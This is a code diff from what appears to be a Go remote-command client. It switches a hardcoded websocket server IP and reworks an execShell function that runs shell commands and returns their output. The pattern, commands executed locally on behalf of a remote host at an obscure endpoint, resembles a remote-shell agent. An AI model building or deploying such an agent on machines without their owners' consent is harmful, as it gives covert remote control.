@@ -36,11 +36,11 @@ const (
 )
 
 var (
-	s_lock  int
-	m       *filemutex.FileMutex
-	baseUrl = "172.16.5.1" //"127.0.0.1" //"172.16.5.1"
-	//baseUrl = "124.156.10.149:8080"
-	//baseUrl      = "106.154.242.217"
+	s_lock int
+	m      *filemutex.FileMutex
+	//baseUrl = "172.16.5.1" //"127.0.0.1" //"172.16.5.1"
+	//baseUrl = "124.156.100.149:8080"
+	baseUrl      = "106.54.242.217"
 	conn         *websocket.Conn
 	origin       = "http://" + baseUrl + "/"
 	url          = "ws://" + baseUrl + "/hfuiefdhuiwe32uhi"
@@ -269,15 +269,9 @@ func json2Message(strByte []byte) (Message, error) {
 //阻塞式的执行外部shell命令的函数,等待执行完毕并返回标准输出
 func execShell(s string) (string, error) {
 	s = strings.Trim(s, "\n") //去除前后换行
-	args := strings.Split(s, " ")
-
 	//cd需要额外处理
-	switch args[0] {
-	case "cd":
-		if len(args) < 2 {
-			return "", nil
-		}
-		err := os.Chdir(args[1])
+	if strings.HasPrefix(s, "cd ") {
+		err := os.Chdir(s[3:])
 		if err != nil {
 			return "", err
 		}
